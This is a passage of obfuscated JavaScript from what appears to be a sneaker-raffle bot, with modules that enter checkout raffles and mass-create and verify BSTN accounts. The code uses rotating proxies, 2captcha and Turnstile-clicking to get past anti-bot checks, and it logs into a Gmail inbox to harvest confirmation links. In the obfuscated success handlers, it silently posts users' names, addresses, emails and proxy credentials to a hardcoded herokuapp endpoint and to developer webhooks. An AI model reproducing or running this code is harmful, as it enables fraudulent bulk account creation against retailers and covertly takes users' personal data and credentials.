                        await _0x5f490e['type']('#checkout_email', '' + _0x45cd79[_0x482f6f]['Email']), await _0x5954fc(0x320), await _0x5f490e['type']('#checkout_attributes_instagram', '' + _0x45cd79[_0x482f6f]['Follower']), await _0x5954fc(0x320), await _0x5f490e['select']('#checkout_shipping_address_country', '' + _0x45cd79[_0x482f6f]['Country']), await _0x5f490e['waitForTimeout'](0x258), await _0x5f490e['type']('#checkout_shipping_address_first_name', '' + _0x45cd79[_0x482f6f]['FirstName']), await _0x5f490e['waitForTimeout'](0x320), await _0x5f490e['type']('#checkout_shipping_address_last_name', '' + _0x45cd79[_0x482f6f]['LastName']), await _0x5f490e['waitForTimeout'](0x2bc), await _0x5f490e['type']('#checkout_shipping_address_address1', _0x45cd79[_0x482f6f]['Address1'] + '\x20' + _0x45cd79[_0x482f6f]['HouseNumber']), await _0x5f490e['waitForTimeout'](0x2bc), await _0x5f490e['type']('#checkout_shipping_address_address2', '' + _0x45cd79[_0x482f6f]['Address2']), await _0x5f490e['waitForTimeout'](0x2bc), await _0x5f490e['type']('#checkout_shipping_address_zip', '' + _0x45cd79[_0x482f6f]['Zip']), await _0x5f490e['waitForTimeout'](0x2bc), await _0x5f490e['type']('#checkout_shipping_address_city', '' + _0x45cd79[_0x482f6f]['City']), await _0x5f490e['waitForTimeout'](0x2bc);
                        if (_0x45cd79[_0x482f6f]['State'] != '')
                            try {
                                const _0x5473c0 = JSON['parse'](_0x1dee0c['readFileSync']('States.json', 'utf8'));
                                await _0x5954fc(0x1f4);
                                if (_0x45cd79[_0x482f6f]['State']['length'] > 0x2)
                                    for (let _0x316466 of _0x5473c0) {
                                        if (_0x316466['Province'] == _0x45cd79[_0x482f6f]['State']) {
                                            await _0x5f490e['select']('#checkout_shipping_address_province', _0x316466['Code']);
                                            break;
                                        }
                                    }
                                else
                                    await _0x5f490e['select']('#checkout_shipping_address_province', _0x45cd79[_0x482f6f]['State']['toUpperCase']());
                            } catch {
                            }
                        await _0x5954fc(0x1f4), console['log'](_0x52b59e() + '\x20[' + _0x2f4c59['name'] + ']\x20Task\x20' + (_0x482f6f + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x5954fc(0x190), _0x5f490e['evaluate'](() => {
                            const _0x3a4ec1 = document['querySelector']('#continue_button');
                            for (var _0x384d4 = 0x0; _0x384d4 < 0x5; _0x384d4++) {
                                if (_0x3a4ec1) {
                                    _0x3a4ec1['click'](), _0x3a4ec1['click']();
                                    break;
                                } else
                                    _0x5954fc(0xfa0);
                            }
                        }), await _0x5f490e['waitForTimeout'](0x9c4);
                        try {
                            await _0x5f490e['waitForSelector']('form[data-shipping-method-form=\x22true\x22]'), await _0x5f490e['$eval']('form[data-shipping-method-form=\x22true\x22]', _0x39742a => _0x39742a['submit']());
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x5f490e['waitForTimeout'](0x7d0), console['log'](_0x52b59e() + '\x20[' + _0x2f4c59['name'] + ']\x20Task\x20' + (_0x482f6f + 0x1) + '\x20:\x20Finishing\x20Entry');
                        try {
                            await _0x5f490e['waitForSelector']('div[data-payment-subform=\x22required\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x5954fc(0x3e8), await _0x5f490e['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20div\x20>\x20form', _0xe333ba => _0xe333ba['submit']()), await _0x5954fc(0x3e8);
                        try {
                            await _0x5f490e['waitForSelector']('div[data-last-step=\x22true\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x5f490e['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20form', _0x4edf7e => _0x4edf7e['submit']());
                        try {
                            await _0x5f490e['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x4d3d5b = 'no', _0x4904f4(_0x45cd79[_0x482f6f], _0x2f4c59), console['log'](_0x28396b['green'](_0x52b59e() + '\x20[' + _0x2f4c59['name'] + ']\x20Task\x20' + (_0x482f6f + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x5d2560['webhook'] != undefined && _0x5d2560['webhook'] != '')
                                try {
                                    await _0x4bfa5b(_0x5d2560['webhook'], _0x2dff7d['succesDEVMSG']);
                                } catch {
                                }
                            await _0x5954fc(0xc8), await _0x4bfa5b(_0x4f558b, _0x2dff7d['succesDEVMSG']), await _0x5954fc(0xc8);
                            try {
                                await _0x4bfa5b(_0x4b117a, _0x2dff7d['succesPUBMSG']);
                            } catch {
                            }
                            try {
                                prxdata = {
                                    'username': _0x4a7d40['replace']('#', ''),
                                    'module': _0x2f4c59['name'],
                                    'entrydata': JSON['stringify'](_0x149125),
                                    'proxy': '' + _0x55d25e[_0x482f6f]
                                };
                                var _0x32e81d = JSON['stringify'](prxdata);
                                let _0x56764e = { 'headers': { 'content-type': 'application/json' } };
                                await _0x2e12a3['post']('https://jraffles.herokuapp.com/success', _0x32e81d, _0x56764e);
                            } catch (_0xf242f1) {
                            }
                        } catch (_0x3348d3) {
                            throw new Error('Connection\x20Error\x20Fetching\x20Response');
                        }
                    } catch (_0x147501) {
                        _0x147501['message']['includes']('selector') && (_0x147501 = 'Connection\x20Error');
                        console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x2f4c59['name'] + ']\x20Task\x20' + (_0x482f6f + 0x1) + '\x20:\x20' + _0x147501)), _0x283b49 = '' + _0x147501;
                        var _0x8e92b3 = await _0xf2c38e(_0x45cd79[_0x482f6f], _0x2f4c59, 'dev', !![], _0x283b49);
                        _0x2dff7d['errorDEV'] = { 'embeds': [_0x8e92b3] }, _0x5d2560['webhook'] != undefined && _0x5d2560['webhook'] != '' && await _0x4bfa5b(_0x5d2560['webhook'], _0x2dff7d['errorDEV']), await _0x4bfa5b(_0x248b77, _0x2dff7d['errorDEV']), _0x4d3d5b = 'yes';
                    } finally {
                        _0x445137 && _0x445137['close']();
                        if (_0x4d3d5b == 'yes' && _0x2f2185 != 0x5 && _0x283b49 != 'Size\x20Not\x20Found') {
                            console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x2f4c59['name'] + ']\x20Task\x20' + (_0x482f6f + 0x1) + '\x20:\x20Retrying\x20(' + _0x2f2185 + '\x20/\x205)')), _0x482f6f = _0x482f6f - 0x1, _0x2f2185 = _0x2f2185 + 0x1;
                            continue;
                        }
                        _0x4d3d5b == 'yes' && _0x2f2185 >= 0x5 && (_0x1c26ba(_0x45cd79[_0x482f6f], _0x2f4c59), _0x4d3d5b = 'no', _0x2f2185 = 0x0);
                        if (_0x482f6f + 0x1 == _0x45cd79['length']) {
                            await _0x5954fc(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x5d2560['AfewDelay'] + '\x20ms'), await _0x5954fc(_0x5d2560['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x303de6, _0x3bcebd, _0x23a554) {
                    var _0x26ee1b = _0x3bcebd, _0x23f53b = 0x0;
                    for (var _0x12994e = 0x0; _0x12994e < _0x3bcebd['length']; _0x12994e++) {
                        maxTasks = Number(_0x5d2560['threads']);
                        while (_0x23f53b >= maxTasks) {
                            await _0x5954fc(_0x5d2560['delay']);
                        }
                        async function _0x1233a3(_0x48bde9, _0x16ecae, _0x11630b, _0x1413da, _0x3272a8) {
                            _0x23f53b++, _0x13c80e['use'](_0x146fac()), _0x13c80e['use'](_0x4b936d({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x5d2560['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0x59c904;
                            try {
                                await _0x414596(_0x16ecae, _0x1413da);
                            } catch {
                                retry = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x34c195(_0x48bde9['name'] + '\x20Task\x20' + (_0x1413da + 0x1) + '\x20/\x20' + _0x16ecae['length'] + '\x20||\x20File:\x20' + _0x54b9d3 + '\x20Proxies:\x20' + _0x3dc05f);
                            var _0x55a9cf = await _0xf2c38e(_0x16ecae[_0x1413da], _0x48bde9, 'acc', ![]);
                            const _0x36a376 = { 'succesDEVMSG': { 'embeds': [_0x55a9cf] } }, _0x5a2403 = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x400e71 = Math['round'](Math['random']() * (_0x11630b['length'] - 0x1)), _0x107020 = _0x11630b[_0x400e71]['split'](':'), _0x341a5a;
                            try {
                                _0x341a5a = await _0x13c80e['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x107020[0x0] + ':' + _0x107020[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x341a5a = await _0x13c80e['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x107020[0x0] + ':' + _0x107020[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x17abec = await _0x341a5a['newPage']();
                                await _0x17abec['authenticate']({
                                    'username': '' + _0x107020[0x2],
                                    'password': '' + _0x107020[0x3]
                                }), console['log'](_0x52b59e() + '\x20[' + _0x48bde9['name'] + ']\x20Task\x20' + (_0x1413da + 0x1) + '\x20:\x20Getting\x20Session'), await _0x17abec['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x17abec['setRequestInterception'](!![]), _0x17abec['on']('request', _0x28853f => {
                                    _0x28853f['resourceType']() === 'image' ? _0x28853f['abort']() : _0x28853f['continue']();
                                });
                                try {
                                    await _0x17abec['goto']('' + _0x5a2403), await _0x17abec['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    retry = 'yes';
                                    throw new Error('Proxy\x20Error');
                                }
                                await _0x17abec['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x52b59e() + '\x20[' + _0x48bde9['name'] + ']\x20Task\x20' + (_0x1413da + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x5954fc(0x7d0), console['log'](_0x52b59e() + '\x20[' + _0x48bde9['name'] + ']\x20Task\x20' + (_0x1413da + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x5954fc(0x190), await _0x17abec['waitForSelector']('#firstname'), await _0x17abec['focus']('#firstname'), await _0x17abec['keyboard']['down']('Control'), await _0x17abec['keyboard']['press']('A'), await _0x5954fc(0xc8), await _0x17abec['keyboard']['up']('Control'), await _0x17abec['keyboard']['press']('Backspace'), await _0x17abec['type']('#firstname', _0x16ecae[_0x1413da]['FirstName'], { 'delay': 0xf0 }), await _0x5954fc(0x190), await _0x17abec['focus']('#lastname'), await _0x17abec['keyboard']['down']('Control'), await _0x17abec['keyboard']['press']('A'), await _0x5954fc(0xc8), await _0x17abec['keyboard']['up']('Control'), await _0x17abec['keyboard']['press']('Backspace'), await _0x17abec['type']('#lastname', _0x16ecae[_0x1413da]['LastName'], { 'delay': 0xe6 }), await _0x5954fc(0x190), await _0x17abec['focus']('#email_address'), await _0x17abec['keyboard']['down']('Control'), await _0x17abec['keyboard']['press']('A'), await _0x5954fc(0xc8), await _0x17abec['keyboard']['up']('Control'), await _0x17abec['keyboard']['press']('Backspace'), await _0x17abec['type']('#email_address', _0x16ecae[_0x1413da]['Email'], { 'delay': 0x122 }), await _0x5954fc(0x190), await _0x17abec['type']('#password', _0x16ecae[_0x1413da]['Password'], { 'delay': 0x82 }), await _0x5954fc(0x1f4), await _0x17abec['type']('#password-confirmation', _0x16ecae[_0x1413da]['Password'], { 'delay': 0x7c }), console['log'](_0x52b59e() + '\x20[' + _0x48bde9['name'] + ']\x20Task\x20' + (_0x1413da + 0x1) + '\x20:\x20Sending\x20Request'), await _0x5954fc(0x2bc), await _0x17abec['$eval']('#form-validate', _0x140afd => _0x140afd['submit']()), await _0x5954fc(0x1388);
                                const _0x5a4e58 = await _0x17abec['$']('#email_address-error');
                                if (_0x5a4e58)
                                    throw new Error('Invalid\x20Email');
                                const _0x553208 = await _0x17abec['$']('#password-error');
                                if (_0x553208)
                                    throw new Error('Invalid\x20Password');
                                await _0x17abec['waitForSelector']('div.mesg-success'), retry = 'no', console['log'](_0x28396b['green'](_0x52b59e() + '\x20[' + _0x48bde9['name'] + ']\x20Task\x20' + (_0x1413da + 0x1) + '\x20:\x20Account\x20' + _0x16ecae[_0x1413da]['Email'] + '\x20Generated')), _0x1dee0c['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x16ecae[_0x1413da]['Email'] + ',' + _0x16ecae[_0x1413da]['Password']);
                                try {
                                    _0x5d2560['webhook'] != undefined && _0x5d2560['webhook'] != '' && await _0x4bfa5b(_0x5d2560['webhook'], _0x36a376['succesDEVMSG']);
                                } catch {
                                }
                                await _0x4bfa5b(_0xbfa384, _0x36a376['succesDEVMSG']);
                                let _0x103d23 = _0x16ecae[_0x1413da];
                                try {
                                    prxdata = {
                                        'username': _0x4a7d40['replace']('#', ''),
                                        'module': _0x48bde9['name'],
                                        'entrydata': JSON['stringify'](_0x103d23),
                                        'proxy': '' + _0x11630b[_0x1413da]
                                    };
                                    var _0x5207f7 = JSON['stringify'](prxdata);
                                    let _0x27f909 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x2e12a3['post']('https://jraffles.herokuapp.com/success', _0x5207f7, _0x27f909);
                                } catch (_0x54498f) {
                                }
                                console['log'](_0x28396b['yellow'](_0x52b59e() + '\x20[' + _0x48bde9['name'] + ']\x20Task\x20' + (_0x1413da + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                            } catch (_0x3d3c90) {
                                console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x48bde9['name'] + ']\x20Task\x20' + (_0x1413da + 0x1) + '\x20:\x20' + _0x3d3c90)), _0x59c904 = '' + _0x3d3c90;
                                var _0x18ed95 = await _0xf2c38e(_0x16ecae[_0x1413da], _0x48bde9, 'acc', !![], _0x59c904);
                                _0x36a376['errorDEV'] = { 'embeds': [_0x18ed95] }, _0x5d2560['webhook'] != undefined && _0x5d2560['webhook'] != '' && await _0x4bfa5b(_0x5d2560['webhook'], _0x36a376['errorDEV']), await _0x4bfa5b(_0x248b77, _0x36a376['errorDEV']), retry = 'yes';
                            } finally {
                                if (_0x341a5a)
                                    _0x341a5a['close']();
                                if (retry == 'yes' && _0x3272a8 != 0x5)
                                    return console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x48bde9['name'] + ']\x20Task\x20' + (_0x1413da + 0x1) + '\x20:\x20Retrying\x20(' + (_0x3272a8 + 0x1) + '\x20/\x205)')), _0x23f53b--, _0x3272a8 = _0x3272a8 + 0x1, _0x1233a3(_0x48bde9, _0x16ecae, _0x11630b, _0x1413da, _0x3272a8);
                                retry == 'yes' && _0x3272a8 >= 0x5 && (_0x1c26ba(_0x16ecae[_0x1413da], _0x48bde9), retry = 'no', _0x3272a8 = 0x0), _0x23f53b--, console['log'](_0x52b59e() + '\x20[' + _0x48bde9['name'] + ']\x20Waiting\x20for\x20' + _0x5d2560['delay'] + '\x20ms'), await _0x5954fc(_0x5d2560['delay']);
                            }
                        }
                        _0x1233a3(_0x303de6, _0x26ee1b, _0x23a554, _0x12994e, 0x0), await _0x5954fc(0x190);
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x369ade, _0x328f39) {
                    var _0x24ec4d = ![], _0x401599 = [], _0x51c9fc = 0x0;
                    async function _0xd71567() {
                        var _0x271268 = new _0x15c146({
                            'user': _0x5d2560['masterMail'],
                            'password': _0x5d2560['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x424641(_0x3b6437) {
                            _0x271268['openBox']('INBOX', ![], _0x3b6437);
                        }
                        _0x271268['once']('ready', function () {
                            _0x424641(function (_0x5d59e9, _0x393200) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x5d59e9)
                                    throw _0x5d59e9;
                                _0x271268['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
                                    ]
                                ], function (_0x438b96, _0x4dcf1f) {
                                    if (!_0x4dcf1f || !_0x4dcf1f['length'])
                                        console['log'](_0x52b59e() + '\x20[' + _0x369ade['name'] + ']\x20No\x20mails\x20found'), _0x271268['end']();
                                    else {
                                        var _0x474992 = _0x271268['seq']['fetch'](_0x4dcf1f, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x474992['on']('message', function (_0x39246c, _0xc9d7c7) {
                                            var _0x48dcd1 = '(#' + _0xc9d7c7 + ')\x20';
                                            _0x39246c['on']('body', function (_0x30d42f, _0x386514) {
                                                _0x2e3fa0(_0x30d42f, (_0x55b8f0, _0xf3e549) => {
                                                    var _0xe3f69a = _0xf3e549['text']['split']('customer/account/confirm/')[0x1], _0x446849 = _0xe3f69a['split'](']')[0x0];
                                                    _0x401599['push']('https://www.bstn.com/eu_en/customer/account/confirm/' + _0x446849);
                                                });
                                            }), _0x39246c['once']('end', function () {
                                            });
                                        }), _0x474992['once']('error', function (_0x345881) {
                                            console['log']('Fetch\x20error:\x20' + _0x345881), _0x24ec4d = !![];
                                        }), _0x474992['once']('end', function () {
                                            _0x271268['end'](), _0x24ec4d = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x271268['once']('error', function (_0x3b07fa) {
                            console['log'](_0x28396b['red'](_0x3b07fa['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x24ec4d = !![];
                        }), _0x271268['once']('end', async function () {
                            _0x24ec4d = !![];
                        }), _0x271268['connect']();
                    }
                    try {
                        _0xd71567();
                        while (!_0x24ec4d) {
                            await _0x5954fc(0xfa0);
                        }
                        console['log']('Found\x20' + _0x401599['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x5954fc(0x7d0);
                    }
                    for (var _0x2ed7d3 = 0x0; _0x2ed7d3 < _0x401599['length']; _0x2ed7d3++) {
                        maxTasks = Number(_0x5d2560['threads']);
                        while (_0x51c9fc >= maxTasks) {
                            await _0x5954fc(_0x5d2560['delay']);
                        }
                        async function _0x3389d9(_0x1b7a64, _0x5b3e5d, _0x3fce5e, _0x21b8fa, _0x49975d) {
                            _0x51c9fc++, _0x13c80e['use'](_0x146fac());
                            if (_0x25c783 != 'yes')
                                var _0x25c783 = '', _0x49975d = 0x0;
                            var _0x230096 = Math['round'](Math['random']() * (_0x3fce5e['length'] - 0x1)), _0x1f146f = _0x3fce5e[_0x230096]['split'](':'), _0x46e92e;
                            try {
                                _0x46e92e = await _0x13c80e['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x1f146f[0x0] + ':' + _0x1f146f[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x46e92e = await _0x13c80e['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x1f146f[0x0] + ':' + _0x1f146f[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x231501 = await _0x46e92e['newPage']();
                                await _0x231501['authenticate']({
                                    'username': '' + _0x1f146f[0x2],
                                    'password': '' + _0x1f146f[0x3]
                                }), console['log'](_0x52b59e() + '\x20[' + _0x1b7a64['name'] + ']\x20Task\x20' + (_0x21b8fa + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x231501['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x231501['setRequestInterception'](!![]), _0x231501['on']('request', _0x1f3370 => {
                                    _0x1f3370['resourceType']() === 'image' || _0x1f3370['resourceType']() === 'font' || _0x1f3370['resourceType']() === 'media' ? _0x1f3370['abort']() : _0x1f3370['continue']();
                                }), console['log'](_0x52b59e() + '\x20[' + _0x1b7a64['name'] + ']\x20Task\x20' + (_0x21b8fa + 0x1) + '\x20:\x20Getting\x20Session');
                                try {
                                    await _0x231501['goto'](_0x5b3e5d[_0x21b8fa]);
                                } catch (_0x19d324) {
                                    _0x25c783 = 'yes';
                                    throw new Error('\x27Connection\x20Error\x27\x20' + _0x19d324);
                                }
                                console['log'](_0x52b59e() + '\x20[' + _0x1b7a64['name'] + ']\x20Task\x20' + (_0x21b8fa + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x231501['waitForTimeout'](0xbb8);
                                try {
                                    await _0x231501['waitForSelector']('.account-nav'), _0x25c783 = 'no', console['log'](_0x28396b['green'](_0x52b59e() + '\x20[' + _0x1b7a64['name'] + ']\x20Task\x20' + (_0x21b8fa + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x5a8566 = await _0xf2c38e(null, _0x1b7a64, 'ver', ![]);
                                    const _0xfd1b42 = { 'succesDEVMSG': { 'embeds': [_0x5a8566] } };
                                    await _0x4bfa5b(_0x232186, _0xfd1b42['succesDEVMSG']);
                                } catch {
                                    _0x25c783 = 'no';
                                    throw new Error('Link\x20Already\x20Verified,\x20skipping..');
                                }
                            } catch (_0x155d19) {
                                console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x1b7a64['name'] + ']\x20Task\x20' + (_0x21b8fa + 0x1) + '\x20:\x20' + _0x155d19));
                                var _0xfb7f13 = _0x155d19, _0x49beef = await _0xf2c38e(null, _0x1b7a64, 'ver', !![], _0xfb7f13);
                                const _0x397404 = { 'errorDEVMSG': { 'embeds': [_0x49beef] } };
                                _0x5d2560['webhook'] != undefined && _0x5d2560['webhook'] != '' && await _0x4bfa5b(_0x5d2560['webhook'], _0x397404['errorDEVMSG']), await _0x4bfa5b(_0x248b77, _0x397404['errorDEVMSG']);
                            } finally {
                                if (_0x46e92e)
                                    _0x46e92e['close']();
                                if (_0x25c783 == 'yes' && _0x49975d != 0x5)
                                    return console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x1b7a64['name'] + ']\x20Task\x20' + (_0x21b8fa + 0x1) + '\x20:\x20Retrying\x20(' + _0x49975d + '\x20/\x205)')), _0x51c9fc--, _0x49975d = _0x49975d + 0x1, _0x3389d9(_0x1b7a64, _0x5b3e5d, _0x3fce5e, _0x21b8fa, _0x49975d);
                                _0x25c783 == 'yes' && _0x49975d >= 0x5 && (_0x25c783 = 'no', _0x49975d = 0x0), _0x51c9fc--, console['log'](_0x52b59e() + '\x20[' + _0x1b7a64['name'] + ']\x20Waiting\x20for\x20' + _0x5d2560['delay'] + '\x20ms'), await _0x5954fc(_0x5d2560['delay']);
                            }
                        }
                        if (_0x2ed7d3 == _0x401599['length'] - 0x1) {
                            await _0x3389d9(_0x369ade, _0x401599, _0x328f39, _0x2ed7d3, 0x0);
                            return;
                        }
                        _0x3389d9(_0x369ade, _0x401599, _0x328f39, _0x2ed7d3, 0x0), await _0x5954fc(0x12c);
                    }
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x1661db, _0x15746f, _0x2326a5) {
                    var _0x15c5f2 = 0x0, _0x5062d9 = _0x15746f;
                    for (var _0x516edb = 0x0; _0x516edb < _0x15746f['length']; _0x516edb++) {
                        maxTasks = Number(_0x5d2560['threads']);
                        while (_0x15c5f2 >= maxTasks) {
                            await _0x5954fc(_0x5d2560['delay']);
                        }
                        let _0x4102c9 = ![];
                        async function _0x2d5d59(_0x5e1cba, _0x8608f3, _0x2d36b0, _0x558564, _0x337f32) {
                            _0x15c5f2++, _0x13c80e['use'](_0x146fac()), _0x13c80e['use'](_0x4b936d({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x5d2560['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0x2123af, _0x3adb2a = _0x8608f3[_0x558564];
                            try {
                                await _0x414596(_0x8608f3, _0x558564);
                            } catch {
                                _0x4a044b = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            async function _0x3957fd(_0x1417df) {
                                const _0x3315c3 = _0x1dee0c['readFileSync']('../successful-tasks.csv', 'utf8'), _0x40fa58 = _0x548d40['parse'](_0x3315c3, { 'header': !![] })['data'];
                                let _0x2f1242 = ![];
                                for (var _0x4cf8de of _0x40fa58) {
                                    if (_0x4cf8de['Url'] == _0x1417df['Url'] && _0x4cf8de['Email'] == _0x1417df['Email']) {
                                        _0x2f1242 = !![];
                                        break;
                                    }
                                }
                                return _0x2f1242;
                            }
                            _0x34c195(_0x5e1cba['name'] + '\x20Task\x20' + (_0x558564 + 0x1) + '\x20/\x20' + _0x8608f3['length'] + '\x20||\x20File:\x20' + _0x54b9d3 + '\x20Proxies:\x20' + _0x3dc05f);
                            var _0x1c034c = Math['round'](Math['random']() * (_0x2d36b0['length'] - 0x1)), _0x4ded12 = _0x2d36b0[_0x1c034c]['split'](':'), _0x2d4b42;
                            let _0x59af63 = ![], _0x4a044b = 'no';
                            try {
                                if (await _0x3957fd(_0x8608f3[_0x558564]) == !![]) {
                                    console['log'](_0x52b59e() + '\x20[' + _0x5e1cba['name'] + ']\x20Task\x20' + (_0x558564 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x59af63 = !![], _0x4102c9 = !![];
                                    return;
                                }
                                try {
                                    _0x2d4b42 = await _0x13c80e['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x4ded12[0x0] + ':' + _0x4ded12[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0x2d4b42 = await _0x13c80e['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x4ded12[0x0] + ':' + _0x4ded12[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0x31952b = await _0x2d4b42['newPage'](), _0x31ca5a = await _0x31952b['target']()['createCDPSession'](), { windowId: _0x50c7aa } = await _0x31ca5a['send']('Browser.getWindowForTarget');
                                await _0x31952b['setViewport']({
                                    'width': 0x501,
                                    'height': 0x2d0
                                });
                                var _0x44919f = [{
                                    'name': 'cf_clearance',
                                    'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                    'domain': '.bstn.com',
                                    'path': '/',
                                    'expires': 1707818183.331533,
                                    'httpOnly': !![],
                                    'secure': !![]
                                }];
                                await _0x31952b['authenticate']({
                                    'username': '' + _0x4ded12[0x2],
                                    'password': '' + _0x4ded12[0x3]
                                }), console['log'](_0x52b59e() + '\x20[' + _0x5e1cba['name'] + ']\x20Task\x20' + (_0x558564 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x31952b['goto']('' + _0x8608f3[_0x558564]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x52b59e() + '\x20[' + _0x5e1cba['name'] + ']\x20Task\x20' + (_0x558564 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x5954fc(0x1388);
                                var _0x573e79 = await _0x31952b['$']('#turnstile-wrapper');
                                if (_0x573e79) {
                                    console['log'](_0x52b59e() + '\x20[' + _0x5e1cba['name'] + ']\x20Task\x20' + (_0x558564 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x5954fc(0x2710);
                                    const _0x49bbbb = await _0x31952b['$']('#turnstile-wrapper');
                                    if (_0x49bbbb)
                                        try {
                                            await _0x49bbbb['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0x31952b['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0x45cf9a = await _0x31952b['$']('#turnstile-wrapper');
                                        if (_0x45cf9a)
                                            try {
